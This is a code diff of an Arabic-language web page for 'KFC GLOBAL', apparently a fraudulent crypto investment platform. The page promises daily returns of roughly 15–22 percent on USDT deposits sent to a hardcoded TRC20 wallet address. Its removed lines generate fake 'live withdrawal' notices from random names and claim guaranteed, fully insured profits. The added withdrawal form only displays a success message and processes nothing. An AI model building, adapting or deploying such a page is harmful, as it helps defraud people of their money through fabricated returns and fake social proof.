@@ -4,18 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
-    <title>KFC GLOBAL - الاستثمار الذكي الموثق</title>
-    <meta property="og:title" content="منصة KFC GLOBAL للاستثمار">
-    <meta property="og:description" content="انضم لأكثر من 15,000 مستثمر ناجح ونمِ أموالك بأمان.">
-    <meta property="og:image" content="https://i.ibb.co/vz6pG8j/kfc-logo.png">
-    <meta property="og:type" content="website">
-
+    <title>KFC GLOBAL - لوحة التحكم الشخصية</title>
+    
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     
     <style>
         :root { --primary: #00e676; --bg: #0a1a15; }
-        body { background-color: var(--bg); color: #e0e0e0; font-family: 'Cairo', sans-serif; margin: 0; overflow-x: hidden; }
+        body { background-color: var(--bg); color: #e0e0e0; font-family: 'Cairo', sans-serif; margin: 0; }
         
         .trust-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 24px; }
         .btn-grad { background: linear-gradient(90deg, #00e676, #1de9b6); color: #052c1e; font-weight: 800; }
@@ -24,216 +20,165 @@
         .page.active { display: block; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* تنبيهات السحب المنبثقة */
-        #live-toast {
-            position: fixed; bottom: 100px; right: 20px; background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(12px); padding: 12px 20px; border-radius: 15px;
-            border-left: 4px solid var(--primary); display: none; z-index: 10000;
-            animation: slideIn 0.5s ease-out;
-        }
-        @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
+        .input-style { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 12px; border-radius: 15px; width: 100%; color: white; outline: none; font-size: 13px; }
+        .input-style:focus { border-color: var(--primary); }
 
-        /* الأسئلة الشائعة */
-        .faq-item { background: rgba(255,255,255,0.02); border-radius: 15px; margin-bottom: 10px; cursor: pointer; }
-        .faq-answer { display: none; padding: 15px; font-size: 12px; color: #aaa; border-top: 1px solid rgba(255,255,255,0.05); }
-
+        .nav-item { color: #555; transition: 0.3s; cursor: pointer; }
         .nav-item.active { color: var(--primary); }
     </style>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800&display=swap" rel="stylesheet">
 </head>
 <body>
 
-    <div id="live-toast">
-        <div class="flex items-center gap-3">
-            <div class="bg-green-500/20 p-2 rounded-full"><i class="fas fa-check text-green-400 text-xs"></i></div>
-            <div>
-                <p id="toast-text" class="text-[10px] font-bold text-white"></p>
-                <p class="text-[8px] text-gray-400">منذ لحظات قليلة</p>
-            </div>
-        </div>
-    </div>
-
-    <div id="auth-screen" class="page active min-h-screen flex flex-col p-8 justify-center">
-        <div class="text-center mb-10">
-            <img src="https://i.ibb.co/vz6pG8j/kfc-logo.png" class="w-20 h-20 mx-auto mb-4 rounded-3xl shadow-2xl">
-            <h1 class="text-2xl font-black text-white">KFC GLOBAL</h1>
-            <p class="text-xs text-gray-500 mt-2 italic">نظام التشفير الاستثماري الأكثر أماناً</p>
-        </div>
-
-        <div class="space-y-4 max-w-md mx-auto w-full">
-            <input id="reg-name" type="text" placeholder="الاسم الثلاثي" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl text-white">
-            <input id="reg-phone" type="tel" placeholder="رقم الهاتف" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl text-white">
-            <button onclick="handleLogin()" class="w-full btn-grad p-4 rounded-2xl">دخول آمن للمنصة</button>
-        </div>
-    </div>
-
-    <div id="main-app" style="display:none">
+    <div id="main-app">
         
         <div id="page-home" class="page active px-5 pt-8 pb-32">
-            <div class="grid grid-cols-2 gap-3 mb-6">
-                <div class="trust-card p-4 text-center">
-                    <p class="text-[8px] text-gray-500 uppercase">إجمالي الاستثمارات</p>
-                    <p class="text-sm font-bold text-green-400">$1,420,500</p>
-                </div>
-                <div class="trust-card p-4 text-center">
-                    <p class="text-[8px] text-gray-500 uppercase">سحوبات ناجحة</p>
-                    <p class="text-sm font-bold text-white">$980,240</p>
-                </div>
+            <div class="trust-card p-6 mb-6">
+                <p class="text-[10px] text-gray-500 uppercase font-bold mb-1">إجمالي الأرباح المتاحة</p>
+                <h3 class="text-4xl font-black text-white italic">$<span id="balance-display">0.00</span></h3>
             </div>
+            <h4 class="text-md font-bold mb-4 border-r-4 border-green-500 pr-2">الخطط المتاحة</h4>
+            <div id="plans-container" class="space-y-4"></div>
+        </div>
 
-            <div class="trust-card p-6 mb-8 bg-gradient-to-br from-green-500/10 to-transparent">
-                <p class="text-[10px] text-gray-400 font-bold mb-1">رصيدك المتاح للسحب</p>
-                <h3 class="text-5xl font-black text-white italic">$<span id="balance">0.00</span></h3>
-            </div>
+        <div id="page-profile" class="page px-6 pt-10 pb-32">
+            <div class="trust-card p-8 text-center relative overflow-hidden">
+                <div class="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center mx-auto mb-4 border border-green-500/20">
+                    <i class="fas fa-user-shield text-3xl text-green-400"></i>
+                </div>
+                <h2 id="display-user-name" class="text-xl font-bold text-white mb-1">جاري التحميل...</h2>
+                <p id="display-user-phone" class="text-gray-500 text-xs mb-6"></p>
 
-            <h4 class="text-md font-bold mb-4 flex items-center gap-2"><i class="fas fa-layer-group text-green-500"></i> خطط الاستثمار النشطة</h4>
-            <div id="plans-container" class="space-y-4 mb-10"></div>
-
-            <h4 class="text-md font-bold mb-4 pr-2 border-r-4 border-blue-500">سحوبات حية الآن</h4>
-            <div class="trust-card overflow-hidden text-[10px] mb-10">
-                <div id="live-transactions" class="divide-y divide-white/5">
+                <div class="space-y-3 text-right">
+                    <div class="bg-white/5 p-4 rounded-2xl flex justify-between items-center">
+                        <span class="text-xs text-gray-400 font-bold">حالة الحساب</span>
+                        <span class="text-[10px] bg-green-500/20 text-green-400 px-2 py-1 rounded-lg">نشط وموثق</span>
                     </div>
-            </div>
-
-            <h4 class="text-md font-bold mb-4 pr-2 border-r-4 border-yellow-500">مركز المساعدة</h4>
-            <div class="space-y-2">
-                <div class="faq-item" onclick="toggleFaq(this)">
-                    <div class="p-4 flex justify-between items-center text-xs font-bold"><span>كيف أبدأ الاستثمار؟</span><i class="fas fa-plus"></i></div>
-                    <div class="faq-answer">يمكنك البدء بشحن محفظتك بـ USDT ثم تفعيل الخطة المناسبة لك لتبدأ الأرباح بالنزول تلقائياً.</div>
+                    <div class="bg-white/5 p-4 rounded-2xl flex justify-between items-center">
+                        <span class="text-xs text-gray-400 font-bold">تاريخ الانضمام</span>
+                        <span class="text-[10px] text-white">2025/12/28</span>
+                    </div>
                 </div>
-                <div class="faq-item" onclick="toggleFaq(this)">
-                    <div class="p-4 flex justify-between items-center text-xs font-bold"><span>هل أموالي في أمان؟</span><i class="fas fa-plus"></i></div>
-                    <div class="faq-answer">نعم، جميع الأصول محمية ببروتوكول التأمين العالمي لضمان رأس المال بنسبة 100%.</div>
+
+                <button onclick="localStorage.clear(); location.reload();" class="mt-8 text-[10px] text-red-500/60 font-bold uppercase tracking-widest">تسجيل الخروج</button>
+            </div>
+        </div>
+
+        <div id="page-withdraw" class="page px-6 pt-10 pb-32">
+            <div class="trust-card p-6">
+                <div class="flex items-center gap-3 mb-6">
+                    <i class="fas fa-money-bill-transfer text-green-400 text-2xl"></i>
+                    <h2 class="text-lg font-bold text-white">طلب سحب الأرباح</h2>
+                </div>
+                
+                <div class="space-y-4">
+                    <div>
+                        <label class="text-[10px] text-gray-500 mr-2 mb-1 block">المبلغ المطلوب (USDT)</label>
+                        <input id="withdraw-amount" type="number" placeholder="0.00" class="input-style">
+                    </div>
+                    <div>
+                        <label class="text-[10px] text-gray-500 mr-2 mb-1 block">رقم الهاتف المرتبط</label>
+                        <input id="withdraw-phone" type="tel" placeholder="00xxxxxxx" class="input-style">
+                    </div>
+                    <div>
+                        <label class="text-[10px] text-gray-500 mr-2 mb-1 block">رابط محفظتك (TRC20)</label>
+                        <input id="withdraw-wallet" type="text" placeholder="Txxxxxxxxxxxxxxxxxxxxxx" class="input-style">
+                    </div>
+                    
+                    <div class="p-3 bg-yellow-500/5 border border-yellow-500/20 rounded-xl">
+                        <p class="text-[9px] text-yellow-500 leading-relaxed">تنبيه: تأكد من صحة بيانات المحفظة، المنصة غير مسؤولة عن التحويل لعنوان خاطئ.</p>
+                    </div>
+
+                    <button onclick="submitWithdraw()" class="btn-grad w-full py-4 rounded-2xl shadow-lg shadow-green-500/20 mt-2">تأكيد عملية السحب</button>
                 </div>
             </div>
         </div>
 
         <div id="page-recharge" class="page px-6 pt-10 text-center pb-32">
             <div class="trust-card p-8">
-                <h2 class="text-lg font-bold mb-4">بوابة الدفع TRC20</h2>
-                <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TLSr6df3gw3BU6uDjbXHEC2WNUTZKxQbK2" class="w-40 h-40 mx-auto rounded-xl mb-6 bg-white p-2">
-                <p class="bg-black/40 p-3 rounded-xl text-[9px] text-green-400 mb-6 font-mono break-all uppercase">TLSr6df3gw3BU6uDjbXHEC2WNUTZKxQbK2</p>
-                <button onclick="copyAddress()" class="btn-grad w-full p-4 rounded-xl mb-8">نسخ العنوان</button>
-
-                <div class="text-right border-t border-white/10 pt-6">
-                    <p class="text-xs font-bold mb-3">تأكيد عملية الشحن</p>
-                    <input id="tx-id" type="text" placeholder="أدخل رقم العملية (TxID)" class="w-full bg-white/5 border border-white/10 p-3 rounded-xl text-[10px] mb-3">
-                    <button onclick="confirmDeposit()" class="w-full bg-white/10 text-xs py-3 rounded-xl">إرسال للمراجعة</button>
+                <h2 class="text-lg font-bold mb-6">شحن المحفظة</h2>
+                <div class="bg-white p-3 w-40 h-40 mx-auto rounded-2xl mb-6">
+                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TLSr6df3gw3BU6uDjbXHEC2WNUTZKxQbK2" class="w-full">
                 </div>
+                <button onclick="navigator.clipboard.writeText('TLSr6df3gw3BU6uDjbXHEC2WNUTZKxQbK2');alert('تم النسخ!')" class="btn-grad w-full p-4 rounded-xl">نسخ عنوان الإيداع</button>
             </div>
         </div>
 
-        <nav class="fixed bottom-0 w-full flex justify-around py-5 bg-[#0a1a15]/98 backdrop-blur-lg border-t border-white/5 z-[5000]">
-            <div class="nav-item active text-center" onclick="switchPage('home', this)"><i class="fas fa-home text-xl mb-1"></i><span class="text-[9px] font-bold">الرئيسية</span></div>
-            <div class="nav-item text-center" onclick="switchPage('recharge', this)"><i class="fas fa-wallet text-xl mb-1"></i><span class="text-[9px] font-bold">إيداع</span></div>
-            <div class="nav-item text-center" onclick="switchPage('profile', this)"><i class="fas fa-user-shield text-xl mb-1"></i><span class="text-[9px] font-bold">حسابي</span></div>
+        <nav class="fixed bottom-0 w-full flex justify-around py-4 bg-[#0a1a15]/95 backdrop-blur-md border-t border-white/5 z-50">
+            <div class="nav-item active text-center" onclick="switchPage('home', this)">
+                <i class="fas fa-home text-lg mb-1 block"></i>
+                <span class="text-[9px] font-bold">الرئيسية</span>
+            </div>
+            <div class="nav-item text-center" onclick="switchPage('withdraw', this)">
+                <i class="fas fa-hand-holding-dollar text-lg mb-1 block"></i>
+                <span class="text-[9px] font-bold">السحب</span>
+            </div>
+            <div class="nav-item text-center" onclick="switchPage('recharge', this)">
+                <i class="fas fa-qrcode text-lg mb-1 block"></i>
+                <span class="text-[9px] font-bold">شحن</span>
+            </div>
+            <div class="nav-item text-center" onclick="switchPage('profile', this)">
+                <i class="fas fa-user-circle text-lg mb-1 block"></i>
+                <span class="text-[9px] font-bold">حسابي</span>
+            </div>
         </nav>
-    </div>
-
-    <div id="plan-modal" class="fixed inset-0 z-[10000] hidden flex items-center justify-center p-6 modal-backdrop">
-        <div class="trust-card bg-[#0a1a15] w-full max-w-sm p-8 text-center relative border-t-4 border-green-500">
-            <div id="modal-icon-box" class="w-16 h-16 bg-green-500/10 rounded-2xl flex items-center justify-center mx-auto mb-4"><i id="modal-icon" class="text-2xl text-green-400"></i></div>
-            <h3 id="modal-name" class="text-xl font-black text-white mb-1"></h3>
-            <p id="modal-cost" class="text-green-400 font-bold mb-6"></p>
-            <div class="text-right space-y-3 mb-8 text-[11px] text-gray-400">
-                <div class="flex gap-2"><i class="fas fa-check-circle text-green-500"></i> <p id="modal-desc"></p></div>
-                <div class="flex gap-2"><i class="fas fa-check-circle text-green-500"></i> <p>سحب فوري للأرباح بعد 24 ساعة.</p></div>
-                <div class="flex gap-2"><i class="fas fa-check-circle text-green-500"></i> <p>ضمان استعادة رأس المال في حال توقف المهمة.</p></div>
-            </div>
-            <button onclick="confirmPlan()" class="w-full btn-grad p-4 rounded-xl mb-4">تفعيل واشتراك</button>
-            <button onclick="closeModal()" class="text-gray-500 text-[10px] font-bold">إلغاء</button>
-        </div>
     </div>
 
     <script>
         const tiers = [
-            { id: 1, cost: 100, daily: 15, name: "الباقة الفضية", icon: "fas fa-shield-alt", desc: "روبوت التداول المستوى 1: يقوم بفتح 5 صفقات سكالبينج مضمونة." },
-            { id: 2, cost: 300, daily: 55, name: "الباقة الماسية", icon: "fas fa-gem", desc: "روبوت التداول المستوى 2: صفقات متوسطة المدى بربح تراكمي مرتفع." },
-            { id: 3, cost: 600, daily: 130, name: "الباقة الملكية", icon: "fas fa-crown", desc: "روبوت التداول المستوى 3: إدارة محفظة كاملة مع أولوية السحب الفوري." }
+            { id: 1, cost: 100, daily: 15, name: "الباقة الفضية", icon: "fas fa-shield-alt" },
+            { id: 2, cost: 300, daily: 55, name: "الباقة الماسية", icon: "fas fa-gem" },
+            { id: 3, cost: 600, daily: 130, name: "الباقة الملكية", icon: "fas fa-crown" }
         ];
 
-        // نظام التنبيهات المنبثقة
-        const names = ["Ahmad***", "Khaled***", "Sara***", "User44***", "Omer***", "Fatima***"];
-        function showToast() {
-            const name = names[Math.floor(Math.random() * names.length)];
-            const amount = (Math.random() * 500 + 50).toFixed(0);
-            document.getElementById('toast-text').innerText = `قام ${name} بسحب $${amount} بنجاح ✅`;
-            const toast = document.getElementById('live-toast');
-            toast.style.display = 'block';
-            setTimeout(() => { toast.style.display = 'none'; }, 4000);
-        }
-        setInterval(showToast, 8000);
-
-        // جدول السحوبات الأخيرة
-        function renderLiveTransactions() {
-            let html = '';
-            for(let i=0; i<5; i++) {
-                const name = names[Math.floor(Math.random() * names.length)];
-                const amount = (Math.random() * 300 + 20).toFixed(2);
-                html += `
-                    <div class="flex justify-between p-3 items-center">
-                        <span class="text-white">${name}</span>
-                        <span class="text-green-400 font-bold">+$${amount}</span>
-                        <span class="text-gray-600 text-[8px]">ناجحة ✅</span>
-                    </div>
-                `;
+        // تشغيل البيانات عند فتح الموقع
+        window.onload = () => {
+            const user = JSON.parse(localStorage.getItem('kfc_user'));
+            if (user) {
+                document.getElementById('balance-display').innerText = user.balance.toFixed(2);
+                document.getElementById('display-user-name').innerText = user.name;
+                document.getElementById('display-user-phone').innerText = user.phone;
+                renderPlans();
+            } else {
+                // إذا لم يسجل دخول، ارجعه لصفحة التسجيل (يمكنك إضافة الكود هنا)
+                alert("يرجى تسجيل الدخول أولاً");
             }
-            document.getElementById('live-transactions').innerHTML = html;
-        }
-
-        function handleLogin() {
-            const name = document.getElementById('reg-name').value;
-            if(name.length < 3) return alert("يرجى إدخال اسم حقيقي للمتابعة.");
-            const user = { name, balance: 0 };
-            localStorage.setItem('kfc_user', JSON.stringify(user));
-            startApp(user);
-        }
-
-        function startApp(u) {
-            document.getElementById('auth-screen').style.display = 'none';
-            document.getElementById('main-app').style.display = 'block';
-            document.getElementById('balance').innerText = u.balance.toFixed(2);
-            renderPlans();
-            renderLiveTransactions();
-        }
+        };
 
         function renderPlans() {
             document.getElementById('plans-container').innerHTML = tiers.map(t => `
-                <div class="trust-card p-5 flex justify-between items-center" onclick="openModal(${t.id})">
+                <div class="trust-card p-5 flex justify-between items-center" onclick="alert('قم بالإيداع أولاً لتفعيل ${t.name}')">
                     <div class="flex items-center gap-4">
-                        <div class="w-12 h-12 bg-white/5 rounded-xl flex items-center justify-center text-green-400"><i class="${t.icon}"></i></div>
-                        <div><p class="font-bold text-sm text-white">${t.name}</p><p class="text-[9px] text-green-500 font-bold">الربح المتوقع: $${t.daily}/يوم</p></div>
+                        <div class="w-10 h-10 bg-green-500/10 rounded-lg flex items-center justify-center text-green-400"><i class="${t.icon}"></i></div>
+                        <div><p class="font-bold text-sm text-white">${t.name}</p><p class="text-[9px] text-green-500">ربح: $${t.daily}/يوم</p></div>
                     </div>
-                    <div class="text-right"><p class="text-white font-black italic">$${t.cost}</p><i class="fas fa-chevron-left text-[8px] text-gray-700"></i></div>
+                    <p class="text-white font-black italic">$${t.cost}</p>
                 </div>
             `).join('');
         }
 
-        function openModal(id) {
-            const p = tiers.find(x => x.id === id);
-            document.getElementById('modal-name').innerText = p.name;
-            document.getElementById('modal-icon').className = p.icon;
-            document.getElementById('modal-cost').innerText = "رسوم التفعيل: $" + p.cost;
-            document.getElementById('modal-desc').innerText = p.desc;
-            document.getElementById('plan-modal').classList.remove('hidden');
-        }
-
-        function closeModal() { document.getElementById('plan-modal').classList.add('hidden'); }
-        function confirmPlan() { closeModal(); switchPage('recharge'); }
-        function toggleFaq(el) { const ans = el.querySelector('.faq-answer'); ans.style.display = ans.style.display === 'block' ? 'none' : 'block'; }
-        function copyAddress() { navigator.clipboard.writeText('TLSr6df3gw3BU6uDjbXHEC2WNUTZKxQbK2'); alert('تم النسخ!'); }
-        function confirmDeposit() { if(document.getElementById('tx-id').value.length < 10) return alert("رقم العملية غير صحيح."); alert("تم إرسال الطلب! سيتم التحقق من الإيداع خلال دقائق."); }
-
         function switchPage(pId, el) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.getElementById('page-' + pId).classList.add('active');
-            if(el) { document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); el.classList.add('active'); }
+            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+            el.classList.add('active');
         }
 
-        window.onload = () => {
-            const saved = localStorage.getItem('kfc_user');
-            if(saved) startApp(JSON.parse(saved));
-        };
+        function submitWithdraw() {
+            const amount = document.getElementById('withdraw-amount').value;
+            const phone = document.getElementById('withdraw-phone').value;
+            const wallet = document.getElementById('withdraw-wallet').value;
+
+            if(!amount || !phone || !wallet) {
+                return alert("يرجى إكمال جميع البيانات لضمان وصول أموالك.");
+            }
+
+            alert(`تم استلام طلبك بنجاح ✅\nالمبلغ: ${amount} USDT\nسيتم التحقق والتحويل للمحفظة خلال 24 ساعة.`);
+            
+            // إعادة تفريغ الحقول
+            document.getElementById('withdraw-amount').value = "";
+            document.getElementById('withdraw-wallet').value = "";
+        }
     </script>
 </body>
 </html>
